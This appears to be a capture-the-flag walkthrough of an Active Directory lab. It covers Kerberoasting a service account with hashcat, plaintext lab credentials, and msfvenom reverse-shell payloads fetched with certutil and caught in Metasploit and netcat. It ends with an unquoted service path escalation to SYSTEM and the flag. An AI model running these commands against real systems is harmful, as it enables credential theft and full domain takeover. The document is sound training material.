d77432aeed128fa99324403481c4efaa9d2e2b07ae087897acda6b57cbbcc2b515447bc8f69c8c209fc1318e2850f5907bd92e4150c49b75ee71ddc26db9e9796967eca309e4e2932fefb59f2aa48361971bb04c72c0d095982eaa3d85be89e16dfd7f2d8020f25a4ed443dc56a55fed9adf170ac0e29481dd5802a6aa17472a719305bc196678d49b54d1938f54b6e198f063d5ebe0918a8ee49c62052158aefdc94719dd96695e14eb2af04771a5c7663ddd9049829ad2a68d24304f6dc9e55d4

# The user has Kerberos authentication enabled and it has SPN, with this SPN sevice ticket is requested which we can crack as below

                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ `hashcat -m 13100  -a 0 hash ~/Downloads/rockyou.txt` 
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 16.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: cpu-sandybridge-Intel(R) Core(TM) i3-8130U CPU @ 2.20GHz, 1436/2937 MB (512 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache built:
* Filename..: /home/kali/Downloads/rockyou.txt
* Passwords.: 14344391
* Bytes.....: 139921497
* Keyspace..: 14344384
* Runtime...: 2 secs

$krb5tgs$23$*bitbucket$LAB.ENTERPRISE.THM$LAB.ENTERPRISE.THM/bitbucket*$9904ae58ab703ae34d6557daaa11782c$b413a63b353c4b707b8688a80102a7d189987d7e66d9f976c29027341e743108196632b84b29794ab481c540b8234e9100ae5d14c63dbca14a28ab45efade152d9877508a3e34cf79f07685e4cb65b797823d3f87f71b895be5f087d8a13a200cf45905b045e9fec90dc5e3047b69c8a5b867be84272d9c162e178ef32a63d2da9bd8680b7957926044a135b65743f8d516f467dc8c270496efd6bf0092c2e74c5db8ba5abf4a46e0e108b6c787c3e29fc2bb1d4e9ad9a4d916e860ff3eafd6a02fc86f1e07a13dc8c3b1c8eda4dbe1064bdb4aef5367d3ff3efc70ba00e1000ec5d5e2c542a11fe4334800d3cbbaedd59fb43c5938a42feb0682891aa6ff3690b5747c4cff8675e7fc92aa13c6dcc826da7904382fac5368b510f259fb6decff7c84c731d9cdc14817424162653440ef74f3c523291030e1ae4128d30d0cd55adabab5ae6e1800630515e37ef380256d8d1c78138972b68c9e4b8492fee4649b3c413a2bb8e98e0ed885617d601f27b948f120de42a5d6d4837f64d12ae9616eded580c925fe831d947e38ad7571d09ecd510f905010735ef61c1742d139be67d60f0ebecd347d9e744e31074541d46db8d0df7e54ecbcccba80915fae86ed223263ebe8df5e55da3ee564f2169dd139068ba878bc798e0bb43ba0b5f29342ec1095487542c5a64b5331e1f6830b563be2689870fd227a53888f98afc9c6272a0ba89943892ff32b80cde810831be7ec0582ff56c4f8966b590d1da4a6b571643bfb506c3c29a9c0b902cce68e731a2655ee27aab2191a75c389e41fd00223330e10473c84e113c54aff1e0d5bbe8cf161494d601b72e03f54203be0dcda2836dae368a74d6e6d4b095d4b10046f2385ed9d4fa997eb2859680f8012e4e465f3e450ff0c5be6ff3c614d44733a5f49ab1ec62756434efc39c7b60a2ad816a21398db285a6a6d355beb59ce3b7e161962b557c580ec6c23bd25e20bfdc8a7881bee0dc6d2232a939fd838134cd62f1fa4050c65cb9700fcb54cd80d7b9afd8c71820c72f17320088d4d30ddefa5260f3814482b2b9d7f79fb8b399e5df4398ba059d77432aeed128fa99324403481c4efaa9d2e2b07ae087897acda6b57cbbcc2b515447bc8f69c8c209fc1318e2850f5907bd92e4150c49b75ee71ddc26db9e9796967eca309e4e2932fefb59f2aa48361971bb04c72c0d095982eaa3d85be89e16dfd7f2d8020f25a4ed443dc56a55fed9adf170ac0e29481dd5802a6aa17472a719305bc196678d49b54d1938f54b6e198f063d5ebe0918a8ee49c62052158aefdc94719dd96695e14eb2af04771a5c7663ddd9049829ad2a68d24304f6dc9e55d4:littleredbucket
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*bitbucket$LAB.ENTERPRISE.THM$LAB.ENTER...9e55d4
Time.Started.....: Sat Jun  8 10:02:14 2024 (3 secs)
Time.Estimated...: Sat Jun  8 10:02:17 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/home/kali/Downloads/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   757.7 kH/s (0.67ms) @ Accel:256 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 1570816/14344384 (10.95%)
Rejected.........: 0/1570816 (0.00%)
Restore.Point....: 1569792/14344384 (10.94%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: livelife93 -> liss27
Hardware.Mon.#1..: Util: 51%

Started: Sat Jun  8 10:01:17 2024
Stopped: Sat Jun  8 10:02:19 2024
                                   

# Now we have 2 valid credentials

nik: ToastyBoi! 
bitbucket: littleredbucket

# Lets try RDP with these now
# We get our user flag on desktop only

# Now since we are on DC (domain controller) only. we need to elevate our privileges.

# so first, let's get meterpreter reverse shell so that we could easily work on post-exploitation and privilege escalation.

Generate reverse shell payload using msfvenom

┌──(kali㉿kali)-[~]
└─$ `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.17.6.236 LPORT=4444 -f exe -o /home/kali/rs_exploitl.exe `
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes
Saved as: /home/kali/rs_exploitl.exe

# Now lets transfer it 

──(kali㉿kali)-[~]
└─$ `python -m http.server 80`
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

C:\Users\bitbucket>`certutil -urlcache -f http://10.17.6.236/rs_exploitl.exe exploit.exe `                                ****  Online  ****                                                                                                      CertUtil: -URLCache command completed successfully. 


# now lets execute it and get meterpreter session

[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > `set LHOST 10.17.6.236`
LHOST => 10.17.6.236
msf6 exploit(multi/handler) > `set LPORT 1234`
LPORT => 1234
msf6 exploit(multi/handler) > `set payload windows/x64/meterpreter/reverse_tcppayload => windows/x64/meterpreter/reverse_tcp`
msf6 exploit(multi/handler) > `run`

[*] Started reverse TCP handler on 10.17.6.236:1234 
[*] Sending stage (201798 bytes) to 10.10.141.33
[*] Meterpreter session 754 opened (10.17.6.236:1234 -> 10.10.141.33:51938) at 2024-06-10 23:39:09 -0400
ackground session 754? [y/N] ` y`





# Lets try to find existing vulnerability that can be leveraged to do Privilege Escalation.

First lets try Metasploit exploit suggestor

msf6 post(multi/recon/local_exploit_suggester) > `options`

Module options (post/multi/recon/local_exploit_suggester):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   SESSION                           yes       The session to run this modu
                                               le on
   SHOWDESCRIPTION  false            yes       Displays a detailed descript
                                               ion for the available exploi
                                               ts


View the full module info with the info, or info -d command.

msf6 post(multi/recon/local_exploit_suggester) > `sessions`

Active sessions
===============

  Id   Name  Type                 Information          Connection
  --   ----  ----                 -----------          ----------
  754        meterpreter x64/win  LAB-ENTERPRISE\bitb  10.17.6.236:1234 ->
             dows                 ucket @ LAB-DC       10.10.141.33:51938 (
                                                       10.10.141.33)

msf6 post(multi/recon/local_exploit_suggester) > `set session 754`
session => 754
msf6 post(multi/recon/local_exploit_suggester) > `run`

[*] 10.10.141.33 - Collecting local exploits for x64/windows...
[*] 10.10.141.33 - 193 exploit checks are being tried...
[+] 10.10.141.33 - exploit/windows/local/bypassuac_dotnet_profiler: The target appears to be vulnerable.
[+] 10.10.141.33 - exploit/windows/local/bypassuac_sdclt: The target appears to be vulnerable.
[+] 10.10.141.33 - exploit/windows/local/bypassuac_sluihijack: The target appears to be vulnerable.
[+] 10.10.141.33 - exploit/windows/local/cve_2020_1048_printerdemon: The target appears to be vulnerable.
[+] 10.10.141.33 - exploit/windows/local/cve_2020_1337_printerdemon: The target appears to be vulnerable.
[+] 10.10.141.33 - exploit/windows/local/cve_2022_21882_win32k: The target appears to be vulnerable.
[+] 10.10.141.33 - exploit/windows/local/cve_2022_21999_spoolfool_privesc: The target appears to be vulnerable.
[*] Running check method for exploit 45 / 45
[*] 10.10.141.33 - Valid modules for session 754:
==============================

 #   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/bypassuac_dotnet_profiler                Yes                      The target appears to be vulnerable.
 2   exploit/windows/local/bypassuac_sdclt                          Yes                      The target appears to be vulnerable.
 3   exploit/windows/local/bypassuac_sluihijack                     Yes                      The target appears to be vulnerable.
 4   exploit/windows/local/cve_2020_1048_printerdemon               Yes                      The target appears to be vulnerable.
 5   exploit/windows/local/cve_2020_1337_printerdemon               Yes                      The target appears to be vulnerable.
 6   exploit/windows/local/cve_2022_21882_win32k                    Yes                      The target appears to be vulnerable.
 7   exploit/windows/local/cve_2022_21999_spoolfool_privesc         Yes                      The target appears to be vulnerable.

[*] Post module execution completed
msf6 post(multi/recon/local_exploit_suggester) > 


# Lets try some of these

msf6 exploit(windows/local/bypassuac_dotnet_profiler) > `run`

[-] Handler failed to bind to 10.17.6.236:4444:-  -
[-] Handler failed to bind to 0.0.0.0:4444:-  -
[*] UAC is Enabled, checking level...
[-] Exploit aborted due to failure: no-access: Not in admins group, cannot escalate with this module
[*] Exploit completed, but no session was created.
msf6 exploit(windows/local/bypassuac_dotnet_profiler) > 

So the user is not part of admin group so no UAC exploit will work

# Lets also see PE options available using `winpeas`

# We found a `unquoted service path injection vulnerability` we can take advantage of it

# we can also find this using below commannd on cmd

> `wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """`



C:\Program Files (x86)\Zero Tier\Zero Tier One> contains `ZeroTier One.exe` file

so we can use payload as

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.17.6.236 LPORT=4444 -f exe -o /home/kali/Zero.exe `   

I will transfer `Zero.exe` to the path c:\Program Files (x86)\Zero Tier

with name as ZeroTier.exe , which will allow us to take advantage of the unquoted service name path.

now let's start the service with Powershell

`Start-Service zerotieroneservice`


we got the shell, but after getting the shell 4–5 times it is dying every time, so; I think we need to migrate it to a stable process. we can use a post-exploitation module of Metasploit with is windows/manage/migrate . by using that we can migrate to a more stable process.


# `Note - we chose to generate non meterpreter binary because netcat reversshell works much better and stable also we get directly NT Authority, while in case of meterter binary we might have to do getsystem and all`

┌──(kali㉿kali)-[~]
└─$ `msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.17.6.236 LPORT=4444 -f exe -o /home/kali/Zero.exe  `  
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: /home/kali/Zero.exe
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ `python -m http.server 80`
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.191.179 - - [18/Jun/2024 01:16:22] "GET /Zero.exe HTTP/1.1" 200 -
10.10.191.179 - - [18/Jun/2024 01:16:23] "GET /Zero.exe HTTP/1.1" 200 -
^C
Keyboard interrupt received, exiting.

C:\Program Files (x86)\Zero Tier>`certutil -urlcache -f http://10.17.6.236/Zero.exe Zero.exe `

┌──(kali㉿kali)-[~]
└─$ `nc -nlvp 4444`
listening on [any] 4444 ...

C:\Program Files (x86)\Zero Tier>`net start zerotieroneservice`  

┌──(kali㉿kali)-[~]
└─$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.17.6.236] from (UNKNOWN) [10.10.191.179] 51413
Microsoft Windows [Version 10.0.17763.1817]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>`whoami`
whoami
nt authority\system

C:\Windows\system32>


# Finally we got NT Authroity, no we can also find Root.txt

C:\Windows\system32>`where /r c:\ root.txt`
where /r c:\ root.txt
c:\Users\Administrator\Desktop\root.txt
C:\Windows\system32>`more c:\Users\Administrator\Desktop\root.txt`
more c:\Users\Administrator\Desktop\root.txt
THM{1a1fa94875421296331f145971ca4881}



